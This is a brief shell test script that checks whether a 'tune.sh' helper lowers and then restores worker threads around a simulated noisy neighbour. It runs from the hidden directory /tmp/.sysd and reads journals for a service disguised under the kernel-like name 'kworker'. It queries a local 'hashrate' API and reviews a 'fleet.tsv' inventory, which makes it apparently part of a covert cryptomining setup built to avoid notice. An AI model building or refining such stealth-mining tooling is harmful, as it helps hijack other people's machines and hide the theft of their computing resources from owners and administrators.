#!/bin/sh
# throwaway: prove tune.sh backs off for a noisy neighbour and recovers after
set -u
cd /tmp/.sysd
pkill -x yes 2>/dev/null || true
sleep 2
: > /tmp/.sysd/.tune.stamp
rm -f /tmp/.sysd/threads.local

echo "=== A. IDLE PROBE (expect wanted=2, own_work~0) ==="
sh tune.sh probe

echo
echo "=== B. START A 1-CORE NEIGHBOUR ==="
yes > /dev/null &
echo "$!" > /tmp/neighbour.pid
sleep 15
echo "loadavg: $(cat /proc/loadavg)"
echo "--- tune with cooldown disabled ---"
TUNE_COOLDOWN=1 sh tune.sh
echo "threads.local -> $(cat /tmp/.sysd/threads.local 2>/dev/null)"

sleep 30
echo "--- journal (expect 1 thread) ---"
journalctl -u kworker --no-pager | grep profile | tail -1
curl -s http://127.0.0.1:12701/2/summary | grep -A2 hashrate

echo
echo "=== C. KILL THE NEIGHBOUR, EXPECT RECOVERY TO 2 ==="
kill "$(cat /tmp/neighbour.pid)" 2>/dev/null || true
sleep 15
TUNE_COOLDOWN=1 sh tune.sh
sleep 30
echo "--- journal (expect 2 threads again) ---"
journalctl -u kworker --no-pager | grep profile | tail -1
curl -s http://127.0.0.1:12701/2/summary | grep -A2 hashrate

echo
echo "=== D. INVENTORY ROWS ==="
tail -4 /tmp/.sysd/fleet.tsv
echo "=== DONE ==="

